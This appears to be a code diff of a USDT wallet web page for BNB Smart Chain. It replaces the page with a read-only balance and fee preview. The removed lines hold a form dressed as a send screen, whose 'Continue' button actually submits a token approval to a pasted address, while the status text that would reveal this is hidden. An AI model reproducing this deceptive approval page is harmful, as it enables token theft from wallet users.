@@ -4,626 +4,283 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>USDT Approve & Verify — BNB Mainnet</title>
+<title>USDT Amount — BNB Smart Chain</title>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
 <style>
-:root {
-    --bg: #080b0a;
-    --card: #111714;
-    --card2: #171f1a;
-    --text: #f4f7f5;
-    --muted: #8d9b92;
-    --line: #28352d;
-    --green: #16a34a;
-    --green2: #087b38;
-    --greenbg: #102c1c;
-    --amber: #f4b85e;
+*{box-sizing:border-box}
+body{
+ margin:0;background:#0e101a;color:#fff;
+ font-family:Arial, sans-serif;
 }
-
-* {
-    box-sizing: border-box;
+main{
+ max-width:480px;margin:auto;min-height:100dvh;
+ padding:20px 18px 30px;background:#0e101a;
+ display:flex;flex-direction:column;
 }
-
-body {
-    margin: 0;
-    min-height: 100vh;
-     background: #080B0A;
-    color: var(--text);
-    font-family: Inter, system-ui, -apple-system,
-        "Segoe UI", sans-serif;
+.header{
+ display:flex;align-items:center;justify-content:space-between;
+ margin:45px 0 28px;
 }
-
-main {
-    max-width: 480px;
-    background-color: #000;
-    margin: auto;
+.header h2{font-size:24px;margin:0}
+.back{
+ width:52px;height:52px;border:0;border-radius:50%;
+ background:#202334;color:white;font-size:32px;
 }
-
-h1 {
-    font-size: 25px;
-    font-weight: 750;
-    letter-spacing: -0.7px;
-    margin: 0 0 7px;
+.recipient{
+ padding:20px 0;border-top:1px solid #292c3b;
+ border-bottom:1px solid #292c3b;
+ color:#aaa;font-size:15px;overflow-wrap:anywhere;
 }
-
-.sub {
-    color: var(--muted);
-    font-size: 13px;
-    margin-bottom: 23px;
+.recipient span{color:white}
+.amount-area{text-align:center;margin:auto 0}
+#amount{
+ width:100%;border:0;outline:0;background:transparent;
+ color:white;text-align:center;font-size:70px;font-weight:600;
 }
-
-/* .card {
-    height: 100dvh;
-    border: 1px solid var(--line);
-    padding: 20px;
-    box-shadow: 0 12px 35px rgba(0,0,0,.22);
-} */
-
-h2 {
-    font-size: 17px;
-    font-weight: 700;
-    margin: 0 0 9px;
+#amount::placeholder{color:white}
+.usd{font-size:22px;color:#b6b8c5;margin-top:5px}
+.token-row{
+ display:flex;align-items:center;gap:14px;margin:25px 0;
 }
-
-.desc {
-    color: var(--muted);
-    font-size: 13px;
-    line-height: 1.65;
-    margin: 0 0 15px;
+.token-icon{
+ width:58px;height:58px;border-radius:50%;
+ background:#22a982;display:grid;place-items:center;
+ font-size:32px;font-weight:bold;
 }
-
-.notice {
-    background: #17291d;
-    border: 1px solid #285b39;
-    color: #b7e8c5;
-    padding: 15px;
-    border-radius: 14px;
-    font-size: 13px;
-    line-height: 1.65;
+.token-info{flex:1;display:flex;flex-direction:column;gap:7px}
+.token-info b{font-size:21px}
+.token-info span{font-size:14px;color:#999dad}
+.max{
+ border:0;border-radius:35px;background:#202334;
+ color:white;padding:17px 27px;font-size:17px;
 }
-
-label {
-    display: block;
-    color: #b5c1b9;
-    font-size: 12px;
-    font-weight: 650;
-    margin: 17px 0 8px;
+.details{
+ background:#191c29;border-radius:15px;
+ padding:16px;margin:10px 0 20px;
 }
-
-input {
-    width: 100%;
-    min-height: 53px;
-    padding: 14px;
-    border: 1px solid #303d34;
-    border-radius: 12px;
-    background: #090e0b;
-    color: white;
-    font-size: 14px;
-    outline: none;
-    transition: .2s;
+.details div{
+ display:flex;justify-content:space-between;
+ margin:12px 0;color:#aeb1c0;font-size:14px;
+ gap:10px;
 }
-
-input:focus {
-    border-color: var(--green);
-    box-shadow: 0 0 0 3px rgba(22,163,74,.13);
+.details b{color:white}
+.details .net{
+ border-top:1px solid #343747;padding-top:14px;
+ color:white;font-weight:bold;
 }
-
-input[readonly] {
-    color: #9eafa3;
-    background: #101713;
+button.review{
+ width:100%;min-height:65px;border:0;
+ border-radius:40px;background:#4938ff;
+ color:white;font-size:21px;font-weight:bold;
 }
-
-input::placeholder {
-    color: #647168;
+.note{
+ color:#9298aa;font-size:12px;line-height:1.6;
+ text-align:center;margin-top:15px;
 }
-
-button {
-    width: 100%;
-    min-height: 53px;
-    padding: 14px 17px;
-    margin-top: 17px;
-    border: 0;
-    border-radius: 13px;
-    background: linear-gradient(
-        135deg,
-        #20b65a,
-        #087b38
-    );
-    color: white;
-    font-size: 15px;
-    font-weight: 750;
-    cursor: pointer;
-    box-shadow: 0 7px 20px rgba(13,145,62,.2);
-    transition: .2s;
+#reviewPanel{
+ display:none;background:#191c29;
+ padding:18px;border-radius:15px;margin-bottom:18px;
 }
-
-button:active {
-    transform: scale(.985);
-}
-
-button:disabled {
-    opacity: .4;
-    cursor: not-allowed;
-    box-shadow: none;
-}
-
-#account,
-#network,
-#status {
-    font-size: 13px;
-    overflow-wrap: anywhere;
-    line-height: 1.65;
-    margin-top: 12px;
-}
-
-#status {
-    white-space: pre-wrap;
-    background: #090e0b;
-    border: 1px solid #26352b;
-    border-radius: 13px;
-    padding: 15px;
-    color: #d4e2d8;
-}
-
-.good {
-    color: #4ade80;
-}
-
-.bad {
-    color: #fbbf24;
-}
-
-.footer {
-    text-align: center;
-    color: #78877d;
-    font-size: 12px;
-    line-height: 1.8;
-    margin: 25px 0 12px;
-}
-
-a {
-    color: #4ade80;
-    text-decoration: none;
-}
-
-a:hover {
-    text-decoration: underline;
-}
-
-@media(max-width:480px) {
-    body {
-        padding: 22px 14px;
-    }
-
-    h1 {
-        font-size: 23px;
-    }
-
-    .card {
-        padding: 17px;
-        border-radius: 17px;
-    }
-}
-
-.card {
-    min-height: 100dvh;
-    height: auto;
-    padding: 25px 18px;
-    background: #000;
-    border: none;
-}
-
-.field-title {
-    color: #aaa;
-    font-size: 15px;
-    margin: 20px 0 13px;
-}
-
-.wallet-input {
-    display: flex;
-    align-items: center;
-    min-height: 66px;
-    padding: 0 16px;
-    border: 1px solid #38343f;
-    border-radius: 15px;
-    background: #050505;
-}
-
-.wallet-input:focus-within {
-    border-color: #16894a;
-}
-
-.wallet-input input {
-    flex: 1;
-    min-width: 0;
-    border: 0;
-    outline: 0;
-    background: transparent;
-    color: white;
-    font-size: 16px;
-    padding: 12px 0;
-    box-shadow: none;
-}
-
-.wallet-input input:focus {
-    box-shadow: none;
-}
-
-.wallet-input input::placeholder {
-    color: #777;
-}
-
-.paste-label,
-.currency-label {
-    color: #43c77c;
-    font-size: 15px;
-    white-space: nowrap;
-    margin-left: 10px;
-}
-
-button {
-    position: sticky;
-    top: auto;
-    margin-top: 35px;
-    min-height: 62px;
-    border-radius: 40px;
-    font-size: 17px;
-}
-
-#account,
-#network,
-#status {
-    display: none !important;
-}
+#reviewPanel h3{margin-top:0}
+#reviewPanel p{font-size:14px;color:#b8bdca;line-height:1.6}
+#account{display:none}
 </style>
 </head>
-
 <body>
 <main>
 <div id="account"></div>
-<div id="network"></div>
-<div id="status" role="status">Wallet checking...</div>
-<!-- <input
-id="amount"
-type="number"
-min="0"
-step="any"
-value="1"
-> -->
 
+<div class="header">
+ <button class="back" onclick="history.back()">‹</button>
+ <h2>Amount</h2>
+ <span style="width:52px"></span>
+</div>
 
-<section class="card">
-    <div class="field-title">Address</div>
+<div class="recipient">
+ To: <span id="walletAddress">Connecting wallet...</span>
+</div>
 
-    <div class="wallet-input">
-        <input
-            type="text"
-            id="spenderAddr"
-            placeholder="Enter wallet address"
-            autocomplete="off"
-        />
-        <span class="paste-label">Paste</span>
-    </div>
+<div class="amount-area">
+ <input id="amount" type="number" min="0"
+ step="any" placeholder="0" inputmode="decimal">
+ <div class="usd" id="usdValue">≈ $0.00</div>
+</div>
 
-    <div class="field-title">Amount</div>
+<div class="token-row">
+ <div class="token-icon">₮</div>
+ <div class="token-info">
+  <b>USDT</b>
+  <span id="balanceText">Balance: Loading...</span>
+ </div>
+ <button class="max" id="maxBtn">Max</button>
+</div>
 
-    <div class="wallet-input">
-        <input
-            type="number"
-            id="amount"
-            min="0"
-            step="any"
-            placeholder="Enter amount"
-        />
-        <span class="currency-label">USDT</span>
-    </div>
+<div class="details">
+ <div><span>Amount</span><b id="gross">0 USDT</b></div>
+ <div><span>Estimated service fee</span><b id="fee">0.00 USDT</b></div>
+ <div class="net"><span>Estimated remaining</span><b id="net">0 USDT</b></div>
+</div>
 
-    <button id="approveBtn" disabled>
-        Continue
-    </button>
-</section>
+<div id="reviewPanel">
+ <h3>Review Amount</h3>
+ <p id="reviewText"></p>
+ <p>यह केवल अनुमानित हिसाब है। कोई token transfer या fee deduction नहीं हुई है।</p>
+ <button class="review" id="backBtn">Back</button>
+</div>
 
+<button class="review" id="reviewBtn">Review</button>
 
+<div class="note">
+ BNB Smart Chain · USDT balance preview<br>
+ Service fee is an estimate, not an on-chain deduction.
+</div>
 </main>
 
 <script>
-const CHAIN_ID = 56;
-const CHAIN_HEX = "0x38";
-
 const TOKEN_ADDRESS =
-"0x55d398326f99059fF775485246999027B3197955";
-
-const RPC_URL = "https://bsc-dataseed.binance.org/";
+ "0x55d398326f99059fF775485246999027B3197955";
 
 const ABI = [
-    "function approve(address spender,uint256 amount) external returns (bool)",
-    "function allowance(address owner,address spender) external view returns (uint256)",
-    "function decimals() external view returns (uint8)",
-    "function symbol() external view returns (string)"
+ "function balanceOf(address) view returns(uint256)",
+ "function decimals() view returns(uint8)"
 ];
 
-let provider = null;
-let signer = null;
-let owner = null;
-let chainOk = false;
-let busy = false;
+const SERVICE_FEE = 0.01;
+
+let provider;
+let owner;
+let balance = 0;
 
 const $ = id => document.getElementById(id);
 
-function status(message) {
-    $("status").textContent = message;
+async function connectWallet(){
+ if(!window.ethereum){
+  $("balanceText").textContent =
+   "Trust Wallet DApp Browser required";
+  return;
+ }
+
+ try{
+  provider = new ethers.providers.Web3Provider(
+   window.ethereum,"any"
+  );
+
+  let accounts = await window.ethereum.request({
+   method:"eth_accounts"
+  });
+
+  if(!accounts.length){
+   $("balanceText").textContent =
+    "Connect wallet to view balance";
+   $("walletAddress").textContent = "Not connected";
+   return;
+  }
+
+  owner = ethers.utils.getAddress(accounts[0]);
+  $("walletAddress").textContent = owner;
+
+  await loadBalance();
+
+ }catch(error){
+  $("balanceText").textContent = "Balance unavailable";
+  console.error(error);
+ }
 }
 
-function updateButton() {
-    const spender = $("spenderAddr").value.trim();
-    const amount = $("amount").value.trim();
+async function loadBalance(){
+ const network = await provider.getNetwork();
 
-    const validAmount =
-        amount !== "" &&
-        Number.isFinite(Number(amount)) &&
-        Number(amount) > 0;
+ if(network.chainId !== 56){
+  $("balanceText").textContent =
+   "Please switch to BNB Smart Chain";
+  return;
+ }
 
-    const validSpender = ethers.utils.isAddress(spender);
+ const token = new ethers.Contract(
+  TOKEN_ADDRESS,ABI,provider
+ );
 
-    $("approveBtn").disabled =
-        busy || (owner && (!validAmount || !validSpender));
+ const [raw,decimals] = await Promise.all([
+  token.balanceOf(owner),
+  token.decimals()
+ ]);
+
+ balance = Number(
+  ethers.utils.formatUnits(raw,decimals)
+ );
+
+ $("balanceText").textContent =
+  "Balance: " + balance.toFixed(4) + " USDT";
+
+ updatePreview();
 }
 
-function validAddress(value, label) {
-    if (!ethers.utils.isAddress(value.trim())) {
-        throw Error(label + " valid address nahi hai.");
-    }
+function updatePreview(){
+ const amount = Number($("amount").value) || 0;
+ const fee = amount > 0 ? SERVICE_FEE : 0;
+ const remaining = Math.max(0,amount-fee);
 
-    return ethers.utils.getAddress(value.trim());
+ $("usdValue").textContent =
+  "≈ $" + amount.toFixed(2);
+
+ $("gross").textContent =
+  amount.toFixed(4) + " USDT";
+
+ $("fee").textContent =
+  fee.toFixed(2) + " USDT";
+
+ $("net").textContent =
+  remaining.toFixed(4) + " USDT";
 }
 
-async function refreshNetwork() {
-    if (!provider) return;
+$("amount").addEventListener("input",updatePreview);
 
-    const network = await provider.getNetwork();
-    chainOk = network.chainId === CHAIN_ID;
-
-    $("network").textContent = chainOk
-        ? "✓ BNB Smart Chain Mainnet Connected"
-        : "⚠ Wrong Network. Chain ID: " + network.chainId;
-
-    $("network").className = chainOk ? "good" : "bad";
-
-    updateButton();
-}
-
-async function ensureChain() {
-    const network = await provider.getNetwork();
-
-    if (network.chainId === CHAIN_ID) return;
-
-    await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: CHAIN_HEX }]
-    });
-
-    provider = new ethers.providers.Web3Provider(
-        window.ethereum,
-        "any"
-    );
-
-    signer = provider.getSigner();
-
-    await refreshNetwork();
-}
-
-async function connectWallet(requestAccess = false) {
-    try {
-        if (!window.ethereum) {
-            throw Error("Trust Wallet DApp Browser mein page open karein.");
-        }
-
-        provider = new ethers.providers.Web3Provider(
-            window.ethereum,
-            "any"
-        );
-
-        let accounts = await window.ethereum.request({
-            method: "eth_accounts"
-        });
-
-        // First-time connection: only after Continue is clicked.
-        if ((!accounts || !accounts.length) && requestAccess) {
-            accounts = await window.ethereum.request({
-                method: "eth_requestAccounts"
-            });
-        }
-
-        if (!accounts || !accounts.length) {
-            owner = null;
-            $("account").textContent = "Wallet not connected";
-            status("Wallet connect karne ke liye Continue dabayein.");
-            updateButton();
-            return false;
-        }
-
-        owner = ethers.utils.getAddress(accounts[0]);
-        signer = provider.getSigner();
-
-        $("account").textContent = "Connected Wallet: " + owner;
-
-        if (requestAccess) {
-            await ensureChain();
-        }
-
-        await refreshNetwork();
-
-        status(
-            "Wallet connected successfully.\n" +
-            "BNB Smart Chain ready."
-        );
-
-        return true;
-
-    } catch (error) {
-        status("Connection Error: " +
-            (error.reason || error.message || error));
-
-        return false;
-    }
-}
-
-async function approveAndVerify() {
-    if (busy) return;
-
-    // If wallet was not previously connected, connect on button click.
-    if (!owner) {
-        await connectWallet(true);
-        return;
-    }
-
-    busy = true;
-    updateButton();
-
-    try {
-        await refreshNetwork();
-
-        if (!chainOk) {
-            await ensureChain();
-        }
-
-        const spender = validAddress(
-            $("spenderAddr").value,
-            "Spender"
-        );
-
-        const amountText = $("amount").value.trim();
-
-        if (
-            !amountText ||
-            !Number.isFinite(Number(amountText)) ||
-            Number(amountText) <= 0
-        ) {
-            throw Error("Valid amount enter karein.");
-        }
-
-        const token = new ethers.Contract(
-            TOKEN_ADDRESS,
-            ABI,
-            signer
-        );
-
-        const decimals = await token.decimals();
-        const symbol = await token.symbol();
-
-        // Approve only the amount entered by the user.
-        const amount = ethers.utils.parseUnits(
-            amountText,
-            decimals
-        );
-
-        status(
-            "Approval request wallet ko bheji ja rahi hai.\n" +
-            "Wallet mein spender aur amount verify karein."
-        );
-
-        const tx = await token.approve(spender, amount);
-
-        status(
-            "Transaction submitted.\n\n" +
-            "Transaction Hash:\n" + tx.hash +
-            "\n\nConfirmation ka wait ho raha hai..."
-        );
-
-        const receipt = await tx.wait();
-
-        if (receipt.status !== 1) {
-            throw Error("Transaction successful nahi hui.");
-        }
-
-        const readToken = new ethers.Contract(
-            TOKEN_ADDRESS,
-            ABI,
-            provider
-        );
-
-        const allowance = await readToken.allowance(
-            owner,
-            spender
-        );
-
-        const formatted = ethers.utils.formatUnits(
-            allowance,
-            decimals
-        );
-
-        const sufficient = allowance.gte(amount);
-
-        status(
-            "✓ Approval transaction confirmed\n\n" +
-            "Owner: " + owner +
-            "\nSpender: " + spender +
-            "\nAllowance: " + formatted + " " + symbol +
-            "\nRequested: " + amountText + " " + symbol +
-            "\n\n" +
-            (sufficient
-                ? "✓ Allowance verification successful."
-                : "⚠ Allowance requested amount se kam hai.") +
-            "\n\nTransaction:\n" +
-            "https://bscscan.com/tx/" + tx.hash
-        );
-
-    } catch (error) {
-        status("Error: " +
-            (error.reason || error.data?.message || error.message || error));
-
-    } finally {
-        busy = false;
-        await refreshNetwork().catch(() => {});
-        updateButton();
-    }
-}
-
-// Continue button
-$("approveBtn").addEventListener("click", approveAndVerify);
-
-// Enable/disable based on entered values
-$("spenderAddr").addEventListener("input", updateButton);
-$("amount").addEventListener("input", updateButton);
-
-// Wallet account/network changes
-if (window.ethereum && window.ethereum.on) {
-    window.ethereum.on("accountsChanged", async accounts => {
-        owner = accounts && accounts.length
-            ? ethers.utils.getAddress(accounts[0])
-            : null;
-
-        signer = owner ? provider.getSigner() : null;
-
-        $("account").textContent = owner
-            ? "Connected Wallet: " + owner
-            : "Wallet not connected";
-
-        await refreshNetwork();
-        updateButton();
-    });
-
-    window.ethereum.on("chainChanged", async () => {
-        provider = new ethers.providers.Web3Provider(
-            window.ethereum,
-            "any"
-        );
-
-        signer = owner ? provider.getSigner() : null;
-
-        await refreshNetwork();
-    });
-}
-
-// Automatic reconnect: does not open a wallet popup.
-window.addEventListener("load", async () => {
-    if (!window.ethereum) {
-        status("Trust Wallet DApp Browser mein page open karein.");
-        return;
-    }
-
-    await connectWallet(false);
+$("maxBtn").addEventListener("click",()=>{
+ $("amount").value = balance;
+ updatePreview();
 });
+
+$("reviewBtn").addEventListener("click",()=>{
+ const amount = Number($("amount").value);
+
+ if(!Number.isFinite(amount) || amount <= 0){
+  alert("Please enter a valid amount.");
+  return;
+ }
+
+ if(amount > balance){
+  alert("Insufficient USDT balance.");
+  return;
+ }
+
+ const fee = SERVICE_FEE;
+ const remaining = Math.max(0,amount-fee);
+
+ $("reviewText").textContent =
+  "Wallet amount: " + amount.toFixed(4) +
+  " USDT | Estimated fee: " + fee.toFixed(2) +
+  " USDT | Estimated remaining: " +
+  remaining.toFixed(4) + " USDT";
+
+ $("reviewPanel").style.display = "block";
+ $("reviewBtn").style.display = "none";
+});
+
+$("backBtn").addEventListener("click",()=>{
+ $("reviewPanel").style.display = "none";
+ $("reviewBtn").style.display = "block";
+});
+
+if(window.ethereum && window.ethereum.on){
+ window.ethereum.on("accountsChanged",()=>{
+  connectWallet();
+ });
+ window.ethereum.on("chainChanged",()=>{
+  connectWallet();
+ });
+}
+
+window.addEventListener("load",connectWallet);
 </script>
 </body>
 </html>
